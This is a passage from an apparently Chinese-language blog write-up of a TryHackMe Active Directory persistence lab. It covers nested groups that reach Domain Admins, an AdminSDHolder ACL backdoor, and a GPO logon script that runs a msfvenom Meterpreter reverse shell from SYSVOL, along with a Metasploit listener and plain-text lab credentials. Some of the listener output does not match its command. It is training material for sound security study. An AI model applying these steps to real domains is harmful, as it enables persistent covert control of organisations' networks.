PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path <span class="hljs-string">"OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 5"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup5"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 5"</span> -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup5"</span> -Members <span class="hljs-string">"hybcx_nestgroup4"</span>

#上述组名自定义即可</code></pre>
<p>现在让我们将上述所创建的最后一个组添加到域管理员组：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"Domain Admins"</span> -Members <span class="hljs-string">"hybcx_nestgroup5"</span></code></pre>
<p>最后，我们将低权限的AD用户添加到我们先前所创建的第一个组中：</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#PS</span> C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup1"</span> -Members <span class="hljs-string">"&lt;low privileged username&gt;"</span>

PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup1"</span> -Members <span class="hljs-string">"louis.cole"</span></code></pre>
<p>完成上述操作之后，我们的低权限AD用户将获得针对THMDC(目标域控)机器的访问特权，我们可以使用该低权限用户通过SSH访问THMWRK1跳板主机并执行相关命令来验证这一点：</p>
<pre><code class="hljs scss">za\chloe<span class="hljs-selector-class">.potter</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\chloe.potter&gt;dir \\thmdc.za.tryhackme.loc\c$\ 
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows        
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9

 Directory of \\thmdc.za.tryhackme.loc\c$

<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1 
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">11</span> AM               <span class="hljs-number">169</span> dns_entries.csv
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">19</span> AM    &lt;DIR&gt;          PerfLogs
<span class="hljs-number">05</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">09</span>:<span class="hljs-number">32</span> AM    &lt;DIR&gt;          Program Files
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">08</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          Program Files (x86)     
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">05</span>:<span class="hljs-number">05</span> PM             <span class="hljs-number">7</span>,<span class="hljs-number">168</span> shell.exe
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">17</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">725</span> thm-network-setup-dc.ps1
<span class="hljs-number">07</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">03</span>:<span class="hljs-number">38</span> PM    &lt;DIR&gt;          tmp
<span class="hljs-number">06</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">58</span> PM    &lt;DIR&gt;          Tools
<span class="hljs-number">02</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Users
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">06</span>:<span class="hljs-number">11</span> PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant] 
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">51</span> AM    &lt;DIR&gt;          Windows
               <span class="hljs-number">4</span> File(s)          <span class="hljs-number">9</span>,<span class="hljs-number">165</span> bytes
               <span class="hljs-number">8</span> Dir(s)  <span class="hljs-number">51</span>,<span class="hljs-number">539</span>,<span class="hljs-number">042</span>,<span class="hljs-number">304</span> bytes free</code></pre>
<p>回到我们之前使用administrator帐户所建立的SSH会话界面，我们还可以验证一下，即使我们创建了多个组，域管理员组也只有一个新成员：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt; Get-ADGroupMember -Identity <span class="hljs-string">"Domain Admins"</span>


distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc
name              : Administrator
objectClass       : user
objectGUID        : <span class="hljs-number">0</span>bbd7980-b53b-<span class="hljs-number">4634</span>-<span class="hljs-number">8</span>a28-<span class="hljs-number">57</span>e4234655c2
SamAccountName    : Administrator
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">500</span>

distinguishedName : CN=matthew.williams,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC= 
                    loc
name              : matthew.williams
objectClass       : user
objectGUID        : c4f5743a-c362-<span class="hljs-number">49</span>c5-b95c-<span class="hljs-number">5</span>ec2a33bf480
SamAccountName    : matthew.williams
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1114</span>

distinguishedName : CN=Am0 Net Group <span class="hljs-number">5</span>,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : Am0 Net Group <span class="hljs-number">5</span>
objectClass       : group
objectGUID        : ba545574-<span class="hljs-number">6</span>af9-<span class="hljs-number">4</span>a3d-a8df-<span class="hljs-number">24</span>ab582fc04c
SamAccountName    : am0_nestgroup5
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">6163</span>

distinguishedName : CN=timtaylor Net Group <span class="hljs-number">5</span>,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : timtaylor Net Group <span class="hljs-number">5</span>
objectClass       : group
objectGUID        : c7df8bd5-d8ed-<span class="hljs-number">44</span>a6-<span class="hljs-number">9</span>ec2-<span class="hljs-number">375935</span>db3c83
SamAccountName    : timtaylor_nestgroup5
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">6168</span>

distinguishedName : CN=hybcx Net Group <span class="hljs-number">5</span>,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc 
name              : hybcx Net Group <span class="hljs-number">5</span>
objectClass       : group
objectGUID        : bcf18156-<span class="hljs-number">2091</span>-<span class="hljs-number">4</span>b3d-<span class="hljs-number">89</span>cc-fefae53893fd
SamAccountName    : hybcx_nestgroup5
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">6610</span></code></pre>
<p>虽然这里很多组成员，但这是由于这个靶机是共享的，我们只需要关注之中的<code>hybcx Net Group 5</code>只有这一个</p>
<h2 id="烦人的不仅仅是蓝队">烦人的不仅仅是蓝队</h2>
<p>如果是在现实的企业网络环境中，我们不必创建新的组来进行组嵌套，实际上，我们完全可以利用现有的组来执行组嵌套操作；然而，这是我们在正常的红队评估行动中永远不会做的事情，因为这种组嵌套操作会破坏企业组织的AD域网络结构，如果这种破坏足够充分，那么AD域网络结构将无法恢复。</p>
<p>这意味着：即使蓝队能够将我们所获得的权限取消，企业组织也很可能需要从头开始重建他们的整个AD网络结构，这将会造成企业的重大损失。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301092532408.png" alt="image-20240301092532408"></p>
<h1 id="0x07-通过acl进行持久化">0x07 通过ACL进行持久化</h1>
<p>有时候，我们可能不仅仅想要通过正常的AD组来实现权限维持，而是希望基于所有受保护的组来进行权限维持。</p>
<h2 id="使用ad组模板">使用AD组模板</h2>
<p>虽然我们可以向我们所能找到的每个特权组添加一个受我们控制的AD帐户，但是蓝队仍然可以执行相关的清理操作并删除我们所添加的组成员。为了确保更好进行权限维持，我们可以尝试注入模板以生成默认组，通过对这些模板执行注入操作，即使蓝队删除了我们所添加的组成员，我们也只需要等待模板刷新，然后我们就能再次让我们所控制的AD帐户获得组成员资格。</p>
<p>一个我们可用的模板是AdminSDHolder容器。该容器存在于每个AD域中，我们能够以其ACL(Access Control List-访问控制列表)为模板，从而将权限复制到所有的受保护组中。常见的受保护组包括Domain Admins、Administrators、Enterprise Admins、Schema Admins等特权组。如果想要查看关于受保护组的完整列表，可以访问以下链接：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)">https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)</a></p>
</blockquote>
<p>一个名为SDProp的进程能够获取AdminSDHolder容器的ACL，并可以每60分钟将其应用于所有受保护组；因此，我们可以基于此进程编写一个ACE(访问控制条目)，它将授予我们对于所有受保护组的完全权限。如果蓝队没有意识到这种类型的权限维持技术正在被使用，那么他们将很难完全清除攻击者所获得的权限。因为，即使蓝队删除了那些基于受保护对象或者组的不恰当的权限之后，相关的权限仍然会在一个小时内被重新分配。由于这种重新授权是通过正常的AD过程来进行的，因此这种操作也不会让蓝队收到任何警报提示，这会让蓝队更加难以确定这种持久化权限的来源。</p>
<h2 id="使用adminsdholder容器修改其acls实现权限维持">使用AdminSDHolder容器(修改其ACLs)实现权限维持</h2>
<p>为了基于AdminSDHolder容器来进行权限维持操作，我们还将使用Microsoft管理控制台(MMC-Microsoft Management Console)。我们首先会使用上文所提及的低权限的AD帐户来通过RDP访问跳板主机THMWRK1，然后在跳板机的终端中使用runas命令注入管理员凭据到当前会话中并启动另一个终端程序，最后我们将从此新终端启动MMC：</p>
<pre><code class="hljs scss">xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'grace.clarke'</span> /p:<span class="hljs-string">'Password1'</span> /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard

C:\Users\chloe.potter&gt; runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
#Password:tryhackmewouldnotguess1@

#在新终端界面中执行以下命令
C:\Windows\system32&gt; mmc.exe  #这能让我们以管理员用户身份成功访问到域控制器上的MMC控制台</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303085356250.png" alt="image-20240303085356250"></p>
<p>成功打开MMC窗口之后，我们向其添加“Users and Groups用户和组”管理单元(File-&gt;Add/Remove Snap-in-&gt;Active Directory Users and Computers)，并且选中目标域以启用高级功能(View-&gt;Advanced Features)，然后我们就可以在Domain-&gt;System下面找到AdminSDHolder组：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303085559829.png" alt="image-20240303085559829"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090321147.png" alt="image-20240303090321147"></p>
<p>我们继续导航到该组的Security 属性(右键单击AdminSDHolder-&gt;Properties-&gt;Security)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090415276.png" alt="image-20240303090415276"></p>
<p>让我们在上述界面中添加我们所控制的低权限AD用户，并且授予其完全控制(Full Control)权限：</p>
<ol>
<li>点击<strong>Add</strong>(添加)。</li>
<li>搜索我们所能使用的低权限AD用户名称(例如chloe.potter)，然后点击<strong>Check Names</strong>(检查名称)。</li>
<li>点击<strong>OK</strong>。</li>
<li>选择<strong>Full Control</strong>(完全控制)并点击<strong>Allow</strong>(允许)。</li>
<li>点击<strong>Apply</strong>(应用)。</li>
<li>点击<strong>OK</strong>。</li>
</ol>
<p>添加成功之后，具体结果将如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303090554301.png" alt="image-20240303090554301"></p>
<h2 id="手动启动sdprop进程">手动启动SDProp进程</h2>
<p>正常情况下，我们可能需要等待60分钟，然后我们所添加的低权限用户将能够完全控制所有的受保护组。这是因为安全描述符传播器(SDProp)服务每60分钟会自动执行一次，并且它会将我们所更改的ACL(访问控制列表)传播到所有的受保护组。</p>
<p>tips：SDProp的全称为Security Descriptor Propagator(安全描述符传播器)。</p>
<p>由于等待时间过长，我们将使用Powershell命令来手动启动该进程，我们可以在<code>C:\Tools\</code>目录下找到并使用脚本<code>Invoke-ADSDPropagation</code>来手动启动上述所提及的SDProp进程：</p>
<pre><code class="hljs scss">#使用rdp访问域控制器
xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'administrator'</span> /p:<span class="hljs-string">'tryhackmewouldnotguess1@'</span> /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard

# Enter a PowerShell session
# Now running a PowerShell session on the domain controller...

#PS C:\Tools&gt; Import-Module .\Invoke-ADSDPropagation.ps1 
#PS C:\Tools&gt; Invoke-ADSDPropagation
cd C:\Tools
dir
Import-Module C:\Tools\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation


#不通过RDP的方法，即使用上述runas注入命令所启动的cmd.exe

#powershell -ep bypass

# WinRM to the domain controller as the DA

#Enter-PSSession -ComputerName thmdc.za.tryhackme.loc

# Now running a PowerShell session on the domain controller...

#Import-Module C:\Tools\Invoke-ADSDPropagation.ps1
#Invoke-ADSDPropagation</code></pre>
<p>完成上述操作后，大概等待一分钟左右，然后继续使用上文中的MMC控制台检查受保护组(如Domain Admins组)的安全权限：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091224810.png" alt="image-20240303091224810"></p>
<p>我们可以看到，我们的低权限AD用户对于Domain Admins组具有完全控制权限，我们可以从DA组的安全权限属性中删除低权限AD用户并重新运行PowerShell脚本来验证我们之前所修改的模版组的ACL将继续传播，而且我们的低权限用户将会被再次添加到Domain Admins组的ACL中。有趣的是，虽然我们有权限修改DA组，但是它并不会自动将我们的低权限AD用户(例如grace.clarake)添加到组成员列表中：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091534622.png" alt="image-20240303091534622"></p>
<p>我们可以使用我们所被分配的新权限，将对应的低权限AD用户(例如grace.clarke)作为组成员添加到DA组中：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303091608104.png" alt="image-20240303091608104"></p>
<p>然后验证低权限用户的可用特权：（这里不知道为何验证不成功）</p>
<p>成功实例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094231829.png" alt="image-20240303094231829"></p>
<p>我的示例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094248960.png" alt="image-20240303094248960"></p>
<p>tips：在手动启动SDProp进程之后，我们也可以通过之前的RDP界面(用于低权限AD用户访问跳板主机的RDP，见上文)执行PowerShell命令来向受保护组(例如DA组)手动添加组成员。</p>
<pre><code class="hljs scss">Add-ADGroupMember -Identity 'Domain Admins' -Members 'grace<span class="hljs-selector-class">.clarke</span>'

Get-ADGroupMember -Identity 'Domain Admins' | Where-<span class="hljs-selector-tag">Object</span> {$_<span class="hljs-selector-class">.SamAccountName</span> -eq 'grace<span class="hljs-selector-class">.clarke</span>'}

dir \\thmdc<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\C$\Users</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303094310594.png" alt="image-20240303094310594"></p>
<p>上述的方法我依旧不成功。。。</p>
<h2 id="蓝队正在走下坡路">蓝队正在走下坡路</h2>
<p>我们可以将本小节的权限维持技术与上一小节中的组嵌套技术结合起来。即使蓝队通过更改大量的组撤销了我们所获得的访问权限，但是在60分钟后，我们仍然可以重新被自动分配权限。除非蓝队知道我们所获得的权限是通过修改AdminSDHolder组而来的，否则蓝队每隔60分钟就会感到头疼。</p>
<p>由于这种权限维持是通过合法的AD服务来传播实现的，因此每次发生上述自动分配权限的情况时，蓝队都难以找到真正的问题所在。我们还可以将完全控制权限授予AdminSDHolder模版组中的Domain Users(域用户)组，这意味着任何低权限AD用户都将被授予对于所有的受保护组的完全控制权限。此外，我们还可以将此项技术与完整的DC同步攻击相结合，这意味着蓝队还需要重置目标AD域中的每个凭据以尝试彻底清除我们所获得的权限。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303093752885.png" alt="image-20240303093752885"></p>
<h1 id="0x08-通过gpo实现持久化">0x08 通过GPO实现持久化</h1>
<p>GPO，即组策略对象，它可以被用于帮助我们执行AD枚举、AD攻击或者AD利用等技术，同时，它也可以被用于实现域权限维持。</p>
<p>AD域中的组策略管理(GPM)能够提供一种集中的机制来管理所有域内机器的本地策略配置，包括对受限制组的成员关系、防火墙程序、反病毒程序等功能的配置，以及配置主机启动时应该执行哪些脚本。虽然GPM是一个很好的管理工具，但是攻击者也可能会针对GPM以便在目标AD域中实现权限维持，更糟糕的是，攻击者还可以隐藏恶意的GPO，以至于蓝队难以将恶意的GPO删除。</p>
<h2 id="介绍">介绍</h2>
<p>以下是一些常见的基于GPO的权限维持技术：</p>
<ul>
<li>配置受限制组的成员关系：这将允许我们以管理并访问域内的所有主机。</li>
<li>部署登录脚本：这将确保每次AD用户对域中的主机进行身份验证时(如AD用户的登录操作)，我们都会得到一个shell回调。</li>
</ul>
<p>我们在本小节中会重点关注上述第二种权限维持技术，虽然能够访问所有域内主机是件好事，但是如果能够确保我们以管理员权限来访问这些主机，那就更好了。为此，我们将创建一个链接到Admins OU(组织单元)的GPO，这将允许我们在AD用户每次对域内主机进行身份验证时能够获得相关的shell。</p>
<h2 id="前期准备工作">前期准备工作</h2>
<p>在我们创建GPO之前，我们首先需要生成shell文件、设置端口侦听器以及编写能够执行shell的bat文件。我们可以使用以下命令来生成一个可执行的shell文件：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/meterpreter/reverse_tcp lhost=persistad lport=<span class="hljs-number">5555</span> -f exe &gt; hybcx_shell<span class="hljs-selector-class">.exe</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303095504713.png" alt="image-20240303095504713"></p>
<p>接下来，我们还需要创建一个批处理脚本，此脚本会在AD用户登录主机时在目标系统上运行，该脚本将执行以下操作：</p>
<ol>
<li>将有效载荷文件(即上面所生成的shell文件)从域控制器(DC)上的SYSVOL目录复制到AD用户的计算机上的临时目录下；</li>
<li>等待20秒并完成shell文件的复制；</li>
<li>执行有效载荷文件，生成反向shell。</li>
</ol>
<p>bat脚本(<code>my_script.bat</code>)的内容如下所示：</p>
<pre><code class="hljs scss">#在攻击机上创建一个bat脚本(nano my_script.bat)，内容如下所示：

copy \\za<span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\sysvol\za<span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\scripts\hybcx_shell<span class="hljs-selector-class">.exe</span> C:\tmp\hybcx_shell.exe &amp;&amp; timeout /t <span class="hljs-number">20</span> &amp;&amp; C:\tmp\hybcx_shell.exe</code></pre>
<p>tips：Windows允许我们通过登录GPO执行Batch(批处理)或PowerShell脚本，但是批处理脚本通常比PowerShell脚本更稳定。</p>
<p>我们可以使用scp命令以及上文所提供的Administrator用户凭据，将上述两个文件上传到目标DC的SYSVOL目录中：</p>
<pre><code class="hljs scss">#在攻击机上操作

root:~$ scp hybcx_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

root:~$ scp hybcx_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

#用户名：administrator
#密码：tryhackmewouldnotguess1@</code></pre>
<p>最后，我们还需要在攻击机上设置MSF端口侦听器：</p>
<pre><code class="hljs scss">root:~$ msfconsole -q -x <span class="hljs-string">"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.58.47; set LPORT 5555;exploit"</span>

[*] Using configured payload generic/shell_reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
LHOST =&gt; persistad
LPORT =&gt; <span class="hljs-number">4445</span>
[*] Started reverse TCP handler on <span class="hljs-number">10.50</span>.<span class="hljs-number">84.147</span>:<span class="hljs-number">4445</span></code></pre>
<h2 id="创建gpo">创建GPO</h2>
<p>现在，我们的准备工作已经完成，接下来我们需要创建GPO，我们将通过RDP连接到跳板主机THMWRK1，并使用runas命令注入管理员凭据以启动MMC控制台。这部分内容可以参考上一小节的操作步骤：</p>
<pre><code class="hljs scss">#在攻击机上另启一个终端
xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'chloe.potter'</span> /p:<span class="hljs-string">'Marisa2014'</span> /v:thmwrk1.za.tryhackme.loc /cert:ignore +clipboard

runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
#用户名：administrator
#密码：tryhackmewouldnotguess1@

mmc.exe</code></pre>
<p>在MMC控制台中选择File &gt; Add/Remove Snap-ins，并添加<strong>Group Policy Management</strong>(组策略管理)单元：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303100320547.png" alt="image-20240303100320547"></p>
<p>这里我点击OK之后总是报错，说是不能联系上对应的DC控制器，这里没办法，我就直接照搬看思路了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101446479.png" alt="image-20240303101446479"></p>
<p>在本小节中，我们将编写一个会被应用到所有管理员的GPO，我们先右键点击GPM中的Admins OU，然后选择在当前域中创建GPO以完成链接。我们可以指定一个名称给我们所创建的GPO，如<code>username - persisting GPO</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101530917.png" alt="image-20240303101530917"></p>
<p>tips：从技术上讲，我们也可以将恶意内容写入上图中的默认域策略(Default Domain Policy)，该策略能够被传播给所有的AD对象。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101547299.png" alt="image-20240303101547299"></p>
<p>右键单击我们所创建的GPO并选择Enforced(强制执行)，这将确保我们的策略被应用(即使存在策略冲突，这也能让我们的策略更加优先)：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101614593.png" alt="image-20240303101614593"></p>
<p>右键单击上述恶意策略并选择编辑：</p>
<ol>
<li>在用户配置(User Configuration)下展开<strong>Policies-&gt;Windows Settings</strong>；</li>
<li>选择<strong>Scripts (Logon/Logoff)</strong>；</li>
<li>右键单击<strong>Logon-&gt;Properties</strong>；</li>
<li>选择<strong>Scripts</strong>选项卡；</li>
<li>单击<strong>Add-&gt;Browse</strong>。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101733170.png" alt="image-20240303101733170"></p>
<p>导航到我们存储shell文件以及批处理文件的目录：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101743806.png" alt="image-20240303101743806"></p>
<p>我们选择批处理文件作为脚本，并点击“打开”和“确认”选项，然后继续点击“应用”和“确认”。这将确保每次管理员组(tier 2, 1, and 0)中的成员登录到任何计算机时，我们都会在攻击机上收到一个反向shell回调。</p>
<p>我们将通过模拟管理员用户登录来完成刚才所提及的shell回调过程，为此，我们将重置属于管理员组的某个用户的密码以便我们使用密码模拟登录，我们仍然需要使用上述的MMC控制台，但是这次我们将添加Active Directory Users and Computers管理单元。</p>
<p>选择一个管理员用户并右键单击，然后选择“重置密码…”：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101913295.png" alt="image-20240303101913295"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303101921745.png" alt="image-20240303101921745"></p>
